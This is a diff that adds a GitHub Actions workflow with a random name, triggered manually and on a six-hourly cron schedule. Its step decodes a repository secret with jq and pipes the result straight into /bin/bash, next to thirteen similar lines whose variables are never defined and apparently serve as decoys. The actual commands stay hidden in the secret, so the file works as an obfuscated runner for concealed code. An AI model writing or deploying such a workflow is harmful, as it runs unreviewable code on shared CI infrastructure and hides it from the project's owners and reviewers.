@@ -1,0 +1,30 @@
+name: fretfulpresident
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fretfulpresident
+        env:
+          b9: ${{ secrets.b9 }}
+        run: |
+          echo $b9 | jq -r .wgvlf42716 | /bin/bash
+          echo $pfp7821 | jq -r .ic9480 | /bin/bash
+          echo $i2 | jq -r .l61 | /bin/bash
+          echo $bir0141 | jq -r .uefg97589 | /bin/bash
+          echo $bnrhc6 | jq -r .jvwx95856 | /bin/bash
+          echo $j4965 | jq -r .xb292 | /bin/bash
+          echo $st5 | jq -r .askq58 | /bin/bash
+          echo $pxsz17 | jq -r .cgvga0165 | /bin/bash
+          echo $gdl4129 | jq -r .arv7 | /bin/bash
+          echo $rxcx12 | jq -r .qb524 | /bin/bash
+          echo $ut19 | jq -r .b93657 | /bin/bash
+          echo $mbzbc524 | jq -r .tdrp4472 | /bin/bash
+          echo $ksrhp67704 | jq -r .ga35 | /bin/bash
+          echo $t4192 | jq -r .yue85 | /bin/bash
+
